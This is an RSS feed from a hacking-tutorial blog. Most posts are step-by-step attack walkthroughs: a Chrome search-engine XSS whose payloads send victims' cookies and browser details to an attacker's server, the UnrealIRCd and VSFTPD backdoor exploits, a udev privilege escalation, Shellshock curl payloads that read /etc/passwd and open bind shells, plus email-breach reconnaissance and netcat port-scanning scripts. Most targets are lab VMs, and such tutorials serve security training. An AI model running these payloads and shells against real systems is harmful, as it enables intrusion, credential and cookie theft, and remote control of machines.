<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel><title>metalkey</title><link>https://metalkey.github.io/index.html</link>
<description>Hacking tutorials + info</description><language>en</language>
<lastBuildDate>Fri, 15 Jun 2018 11:50:35 +1000</lastBuildDate>
<pubDate>Fri, 15 Jun 2018 11:50:35 +1000</pubDate>
<atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
<item><title>
Mousejack on the WiFi Pineapple
</title><description><![CDATA[

<p>The Mousejack attack is extremely useful for dropping payloads on machines where vulnerable RF wireless devices are used and after a bit of trial and error, it was possible to get the Jackit exploit tool running on a WiFi Pineapple.<br>
Commands to get things up and running below.<br>
<br>
<b>Note:</b> It is also possible to run Jackit on the Nano but it requires moving Python to an external SD card first.</p>

<div class="code">
root@pineapple:~$ <com>opkg update</com><br>
root@pineapple:~$ <com>opkg install python-pip libusb-1.0 libusb-compat</com><br>
root@pineapple:~$ <com>pip install pyusb click six tabulate</com><br>
...<br>
Download jackit from https://github.com/Sliim/jackit/tree/openwrt-libusb<br>
Modify jackit as per master...Sliim:openwrt-libusb (e.g. wget https://raw.githubusercontent.com/Sliim/jackit/4de42c5d9cdae2ed1009b8cd161101e88ab1c76a/jackit/lib/nrf24.py)<br>
...<br>
root@pineapple:~$ <com>./setup.py build</com><br>
root@pineapple:~$ <com>./setup.py install</com><br>
</div>

<p><b>Jackit Github Page:</b><br>
<a href="https://github.com/insecurityofthings/jackit">https://github.com/insecurityofthings/jackit</a></p>

<p>Tags: <a href='tag_wifi.html'>wifi</a></p>
<!-- text end -->
]]></description><link>https://metalkey.github.io/mousejack-on-the-wifi-pineapple.html</link>
<guid>https://metalkey.github.io/./mousejack-on-the-wifi-pineapple.html</guid>
<dc:creator></dc:creator>
<pubDate>Fri, 15 Jun 2018 11:46:25 +1000</pubDate></item>
<item><title>
Title on this line
</title><description><![CDATA[

<p>The rest of the text file is an <b>html</b> blog post. The process will continue as soon
as you exit your editor.</p>

<p>Tags: <a href='tag_keep-this-tag-format.html'>keep-this-tag-format</a>, <a href='tag_tags-are-optional.html'>tags-are-optional</a>, <a href='tag_example.html'>example</a></p>
<!-- text end -->
]]></description><link>https://metalkey.github.io/title-on-this-line.html</link>
<guid>https://metalkey.github.io/./title-on-this-line.html</guid>
<dc:creator></dc:creator>
<pubDate>Fri, 15 Jun 2018 11:34:58 +1000</pubDate></item>
<item><title>
Google Chrome Search Poison – Default Search Engine Exploit
</title><description><![CDATA[

<h2>Introduction</h2>

<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser. This stored XSS is then executed whenever the victim searches using the omnibox.<br>
In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.<br>
<br>
Note: The vulnerability has been reported to (and ignored by) the Google/Chromium team.</p>

<h2>Video Demo</h2>

<div align="center">
<a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">
<img src="search-poison.jpg" />
</a> 
</div>

<p>The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.<br></p>

<h2>Walkthrough - Setting up the Listener in Kali</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
</div>

<p></code></p>

<h2>Setup on Victim Machine</h2>

<ol>
<li>Go into <strong>"Settings"</strong> in Google Chrome<br></li>
<li>Click on <strong>"Manage Search Engines"</strong><br></li>
<li>Enter your malicious JS and click <strong>"Make Default"</strong><br></li>
</ol>

<h2>Example</h2>

<p><code></p>

<div class="code">
<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
</div>

<p></code>
Note: 192.168.1.182 is our SimpleHTTPServer.<br>
Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br></p>

<h2>Other examples</h2>

<p><code></p>

<div class="code">
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
</div>

<p></code></p>

<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>





<!-- text end -->
]]></description><link>https://metalkey.github.io/google-chrome-search-poison---default-search-engine-exploit.html</link>
<guid>https://metalkey.github.io/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
<dc:creator></dc:creator>
<pubDate>Sun, 27 Aug 2017 14:20:15 +1000</pubDate></item>
<item><title>
Company Email Enumeration + Breached Email Finder
</title><description><![CDATA[

Enumerating email addresses for a target domain and checking if these emails appear in known breaches can be extremely useful when performing recon.<br>
This script will use <b><a href="https://hunter.io">hunter.io</a></b> to enumerate domain emails and feed them into <b><a href="https://hacked-emails.com">hacked-emails.com</a></b> to check if they appear in known breaches.<br>
<br>
<b>Note:</b> Substitute <b>YOURAPIKEY</b> with your hunter.io API key. This can be obtained by creating a hunter.io account.<br>
<br>
<code>
	<div class="code">
root@kali:~#	<com>cat emails.sh</com><br>
		#!/bin/bash<br>
		rm found-emails.txt<br>
		rm hacked-emails.txt<br>
		clear<br>
		echo -e "\e[92mEnter Target Domain:"<br>
		echo -e "\e[39m"<br>
		read hname<br>
		clear<br>
		echo -e "[+] Email Recon Started"<br>
		echo -e "\e[39m"<br>
		<br>
		# Email Checks<br>
		echo "- Enumerating Domain Emails"<br>
		curl -k -s "https://api.emailhunter.co/v1/search?domain=$hname&api_key=<b>YOURAPIKEY</b>" | grep -Po '"value" :.*?[^\\]",' | cut -d'"' -f4 > found-emails.txt<br>
		echo "Found the following emails:"<br>
		cat found-emails.txt<br>
		echo ""<br>
		echo "[+] Checking if Emails have been breached"<br>
		for email in $(cat found-emails.txt);do<br>
		curl -k -s "https://hacked-emails.com/api?q=$email" | grep '"status":"found"' | cut -d'"' -f8 >> hacked-emails.txt &<br>
		done<br>
		wait<br>
		echo "The following email addresses appear in known breaches:"<br>
		cat hacked-emails.txt<br>
		<br>
		echo -e "\e[39m"<br>
		echo -e "[*] Please wait..."<br>
		wait<br>
		echo -e "[END] Email Recon Complete!"<br>
		echo -e ""<br>

	</div>
</code>

<p>Tags: <a href='tag_recon.html'>recon</a></p>




<!-- text end -->
]]></description><link>https://metalkey.github.io/company-email-enumeration--breached-email-finder.html</link>
<guid>https://metalkey.github.io/./company-email-enumeration--breached-email-finder.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Mon, 24 Oct 2016 23:34:08 +1100</pubDate></item>
<item><title>
Installing Wickr on Ubuntu 16.04
</title><description><![CDATA[

<div align="center">
<img src="wickr.png" />
</div>
<br>
<h2>Download Wickr and Dependencies</h2>
<code>
<div class="code">
	user@ubuntu~$ <com>wget https://dls.wickr.com/Downloads/wickr-me_2.6.0_amd64.deb<br></com>
	user@ubuntu~$ <com>wget http://security.ubuntu.com/ubuntu/pool/universe/liba/libav/libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/main/i/icu/libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/universe/x/x264/libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
</div>
</code>

<h2>Install Dependencies and Wickr</h2>
<code>
<div class="code">
	user@ubuntu~$ <com>sudo dpkg -i libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
	user@ubuntu~$ <com>sudo dpkg -i libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
	user@ubuntu~$ <com>sudo dpkg -i libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
	user@ubuntu~$ <com>sudo dpkg -i wickr-me_2.6.0_amd64.deb<br></com>
	user@ubuntu~$ <com>wickr-me<br></com>
</div>
</code>

<p>Tags: <a href='tag_privacy.html'>privacy</a></p>




<!-- text end -->
]]></description><link>https://metalkey.github.io/installing-wickr-on-ubuntu-1604.html</link>
<guid>https://metalkey.github.io/./installing-wickr-on-ubuntu-1604.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 22 Oct 2016 18:13:57 +1100</pubDate></item>
<item><title>
Port Scanning With Netcat (Up to 1000 ports/second)
</title><description><![CDATA[

<p>
<code>
    <div class="code">
        <com>nano catscan.sh</com><br>
        #!/bin/bash<br>
        mkdir catscan-results<br>
        cp targets.txt catscan-results<br>
        cd catscan-results<br>
        <br>
        # Use ping to get IP addresses. Strip bash colours from output with sed<br>
        echo "Generating IP list..."<br>
        for host in $(cat targets.txt);do<br>
            hostip=`ping -c 1 -W 1 $host  | grep PING | cut -d"(" -f2 | cut -d")" -f1 | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"`<br>
                echo "$host resolves to $hostip" <br>
                    echo "$host resolves to $hostip" >> host-ip.txt <br>
                        echo $hostip >> temp-hosts.txt<br>
                        done<br>
                        wait<br>
                        <br>
                        # Sort ips and remove dupes<br>
                        sort -u temp-hosts.txt > hosts.txt<br>
                        rm temp-hosts.txt<br>
                        <br>
                        echo "Starting scan..."<br>
                        # Scan y ports at a time and ouput to results.txt<br>
                        # To change number of ports scanned at a time, change y, x incrementer, y incrementer<br>
                        for ip in $(cat hosts.txt);do<br>
                            x=0<br>
                                y=1000<br>
                                    while [ $y -le 66000 ];do<br>
                                            echo "Scanning $ip (Ports $x - $y)"<br>
                                                    for num in $(seq $x $y);do<br>
                                                                netcat -vzn -w 1 $ip $num >> results.txt 2>&1 &<br>
                                                                        done<br>
                                                                                wait<br>
                                                                                        x=$(( $x + 1000 ))<br>
                                                                                                y=$(( $x + 1000 ))<br>
                                                                                                        grep $ip results.txt | grep " open" results.txt | sort -u<br>
                                                                                                            done<br>
                                                                                                            done<br>
                                                                                                            grep $ip results.txt | grep " open" results.txt | sort -u > open-ports.txt<br>
    </div><br>
</code>
</p>

<p>Tags: <a href='tag_port-scanning.html'>port-scanning</a></p>





<!-- text end -->
]]></description><link>https://metalkey.github.io/port-scanning-with-netcat-up-to-1000pps.html</link>
<guid>https://metalkey.github.io/./port-scanning-with-netcat-up-to-1000pps.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 08 Oct 2016 19:47:58 +1100</pubDate></item>
<item><title>
UnrealIRCD 3.2.8.1 Backdoor Command Execution
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Metasploitable 2<br>
<br>
Unreal IRCD 3.2.8.1 contains a backdoor that is triggered by entering <strong>AB;</strong> upon connecting. The backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.<br>
<br>
The following example demonstrates it’s use on Metasploitable 2 (192.168.1.142).<br></p>

<h2>Generating the Payload</h2>

<p>We’re going to generate a unix bind shell with msfvenom (port 4444) and connect to this with Netcat.
<code></p>

<div class="code">
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl --payload-options</com><br>
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl LHOST=192.168.1.142</com><br>
No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>
No Arch selected, selecting Arch: cmd from the payload<br>
No encoder or badchars specified, outputting raw payload<br>
Payload size: 240 bytes<br>
<b>perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</b><br>
</div>

<p></code></p>

<h2>Triggering the Exploit</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6667</com><br>
(UNKNOWN) [192.168.1.142] 6667 (ircd) open<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br>
<com>AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</com><br>
:irc.Metasploitable.LAN 451 AB;perl :You have not registered
</div>

<p></code></p>

<h2>Connecting to the Netcat Bind Shell</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 4444</com><br>
(UNKNOWN) [192.168.1.142] 4444 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/etc/unreal#
</div>

<p></code></p>

<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>

















<!-- text end -->
]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
<guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 19:11:59 +1000</pubDate></item>
<item><title>
VSFTPD v2.3.4 Backdoor Command Execution
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Windows 10<br>
<br>
VSFTPD v2.3.4 contains a backdoor that is triggered by entering <strong>anystring:)</strong> as the username (no password required). After the backdoor is triggered, the target machine opens a shell on port 6200.<br>
<br>
This example demonstrates it’s use on Metasploitable 2 (192.168.1.142).</p>

<h2>Triggering the Backdoor</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>ftp 192.168.1.142</com><br>
Connected to 192.168.1.142.<br>
220 (vsFTPd 2.3.4)<br>
Name (192.168.1.142:root):<com>123456:)</com><br>
331 Please specify the password.<br>
Password: [Enter]<br>
[CTRL+C]<br>
421 Service not available, remote server has closed connection
</div>

<p></code></p>

<h2>Connecting to the Shell</h2>

<p><code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6200</com><br>
(UNKNOWN) [192.168.1.142] 6200 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/#
</div>

<p></code></p>

<p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>







<!-- text end -->
]]></description><link>https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html</link>
<guid>https://metalkey.github.io/./vsftpd-v234-backdoor-command-execution.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 19:05:03 +1000</pubDate></item>
<item><title>
Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
</title><description><![CDATA[
<strong>Attacker:</strong> Kali Linux<br>
<strong>Victim:</strong> Metasploitable 2<br>
<br>
Note: This exploit leverages a vulnerability in NETLINK.<br>
More information on NETLINK can be found on the Linux Foundation website (<a href="http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto">http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto</a>).</p>

<h2>Download the Exploit from ExploitDB</h2>

<p>Head over to the Exploit Database and download Jon Oberheide’s udev exploit for Linux Kernel 2.6 (<a href="https://www.exploit-db.com/exploits/8572/">https://www.exploit-db.com/exploits/8572/</a>).</p>

<h2>Telnet to Metasploitable 2, then Upload and Compile the Exploit</h2>

<p>Telnet to Metasploitable 2 then start a netcat listener.<br>
In Kali, We’re going to tar the exploit and pipe the output to netcat.<br>
In Metasploitable 2, we’re going to receive and untar the exploit, then compile it with gcc.
<code></p>

<div class="code">
root@kali:~$ <com>telnet 192.168.1.10</com><br>
Trying 192.168.1.10...<br>
Connected to 192.168.1.10.<br>
<br>
Contact: msfdev[at]metasploit.com<br>
Login with msfadmin/msfadmin to get started<br>
metasploitable login: <com>msfadmin</com><br>
Password: <com>msfadmin</com><br>
Linux metasploitable 2.6.24-16-server #1 SMP i686<br>
<br>
msfadmin@metasploitable:~$ <com>nc -lvp 12345 | tar -xf -</com><br>
listening on [any] 12345 ...
</div>

<p></code>
Open a new tab, tar the exploit and pipe the output to netcat
<code></p>

<div class="code">
root@kali:~$ <com>tar -cf - 8572.c | nc -vn 192.168.1.10 12345</com><br>
(UNKNOWN) [192.168.1.10] 12345 (?) open
</div>

<p></code>
Back in the first tab we can see our Kali Machine connect.<br>
Allow a few seconds for the file transfer to complete then CTRL+C to end the session.<br>
Check the exploit has been received, then compile with gcc.<br>
<code></p>

<div class="code">
connect to [192.168.1.10] from kali [192.168.1.182] 48411<br>
msfadmin@metasploitable:~$ <com>ls -lah 8572.c</com><br>
-rw-r--r-- 1 msfadmin msfadmin 2.9K 2015-11-05 04:14 8572.c<br>
msfadmin@metasploitable:~$ <com>gcc 8572.c -o 8572</com>
</div>

<p></code></p>

<h2>Executing the Exploit</h2>

<p>Now we just need to get the PID of the the udevd netlink socket on Metasploitable 2, create our run script (bind an instance of bash to a netcat listener) and execute the exploit
<code></p>

<div class="code">
msfadmin@metasploitable:~$ <com>cat /proc/net/netlink</com><br>
df552800 15 2738 00000001 0 0 00000000 2<br>
msfadmin@metasploitable:~$ <com>cd /tmp</com><br>
msfadmin@metasploitable:/tmp$ <com>nano run</com><br>
<com>#!/bin/bash</com><br>
<com>nc -lvvp 2345 -e /bin/bash</com><br>
msfadmin@metasploitable:/tmp$ <com>cd</com><br>
msfadmin@metasploitable:~$ <com>./8572 2738</com><br>
</div>

<p></code>
Open a new tab and connect to the bind shell
<code></p>

<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.10 2345</com><br>
(UNKNOWN) [192.168.1.10] 2345 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/# <com>whoami</com><br>
root
</div>

<p></code></p>

<p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>

















<!-- text end -->
]]></description><link>https://metalkey.github.io/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
<guid>https://metalkey.github.io/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 18:52:36 +1000</pubDate></item>
<item><title>
Shellshock Explained + Exploitation Tutorial
</title><description><![CDATA[

<h2>Introduction</h2>

<p>Shellshock is a “code injection attack” that takes advantage of a function definition vulnerability in Bash 4.3 and earlier.<br>
The vulnerability is caused by Bash processing trailing strings after function definitions in the values of environment variables. In Bash 4.3 and later, these trailing strings will not be executed.</p>

<h2>Testing</h2>

<p>To test if your system is vulnerable, simply run the command below in a Bash shell.
<code></p>

<div class="code">
user@debian8:~$ <com>env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"</com>
</div>

<p></code>
If 'vulnerable' is echoed back, your system is vulnerable, since echo vulnerable is directly after the function definition env x='() { :;};<br>
A response of 'not-vulnerable' indicates your system is not vulnerable to the test above.<br>
Note: Additional tests should be performed to confirm your system is not vulnerable to Shellshock.<br>
These tests can be found on the Shellshocker Website - <a href="https://shellshocker.net/">https://shellshocker.net/</a></p>

<h2>Exploitation</h2>

<p>Launch the 'Pentester Lab: CVE-2014-6271 Shellshock' VM (<a href="https://pentesterlab.com/exercises/cve-2014-6271">https://pentesterlab.com/exercises/cve-2014-6271</a>) then browse to the VM’s IP in your web-browser.<br>
You will be presented with the output of the [uptime] and [uname -a] Linux commands, running on the Pentesterlab VM.</p>

<blockquote>
  <p>CVE-2014-6271<br>
This system is running:<br>
uptime: 20:44:15 up 0 min, 1 users, load average: 0.06, 0.01, 0.00<br>
kernel: Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux<br></p>
</blockquote>

<p>View the page source and you’ll notice the location of the CGI (<a href="http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/">http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/</a>) script that is executed on the server.</p>

<blockquote>
  <p>$.getJSON("/cgi-bin/status", function (data) {<br></p>
</blockquote>

<p>Let’s use curl to launch a few shellshock attacks against the status CGI script via the User-Agent string (-A in curl).</p>

<h2>Passwd File</h2>

<p><code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status > passwd</com><br>
<br>
user@debian8:~$ <com>cat passwd</com><br>
root:x:0:0:root:/root:/bin/sh<br>
lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
nobody:x:65534:65534:nobody:/nonexistent:/bin/false<br>
tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh<br>
pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh 
</div>

<p></code></p>

<h2>Directory Listing</h2>

<p><code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status</com><br>
bin<br>
boot<br>
dev<br>
etc<br>
home<br>
init<br>
...
</div>

<p></code></p>

<h2>Bind Shell</h2>

<p>Bind an instance of Bash to a netcat listener on port 2345 and connect.<br>
After executing the bind shell on the Shellshock VM (/usr/bin/nc -lvvp 2345 -e /bin/bash) you will need to open a new terminal window to connect using (nc -vn 192.168.1.14 2345)
<code></p>

<div class="code">
user@debian8:~$ <com>curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status</com><br>
<br>
user@debian8:~$ <com>nc -vn 192.168.1.14 2345</com><br>
(UNKNOWN) [192.168.1.14] 2345 (?) open<br>
<br>
<com>whoami</com><br>
<com>pentesterlab</com><br>
<br>
<com>/sbin/ifconfig</com><br>
[eth0]<br>
Link encap:Ethernet HWaddr 08:00:27:84:1F:23<br>
inet addr:192.168.1.14 Bcast:192.168.1.255 Mask:255.255.255.0<br>
inet6 addr: fe80::a00:27ff:fe84:1f23/64 Scope:Link<br>
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1<br>
RX packets:742 errors:0 dropped:0 overruns:0 frame:0<br>
TX packets:426 errors:0 dropped:0 overruns:0 carrier:0<br>
collisions:0 txqueuelen:1000<br>
RX bytes:57418 (56.0 KiB) TX bytes:246492 (240.7 KiB)<br>
Interrupt:10 Base address:0xd020
</div>

<p></code></p>

<h2>Conclusion</h2>

<p>The examples above demonstrate a tiny fraction of what is possible using the Shellshock vulnerability.<br>
<br>
Additional attack vectors include:<br>
– OpenSSH server<br>
– DHCP clients<br>
– Qmail server<br>
– IBM HMC restricted shell<br>
<br>
If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.</p>

<p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>

















<!-- text end -->
]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
<guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
<dc:creator>metalkey</dc:creator>
<pubDate>Sat, 02 Jul 2016 18:01:02 +1000</pubDate></item>
</channel></rss>
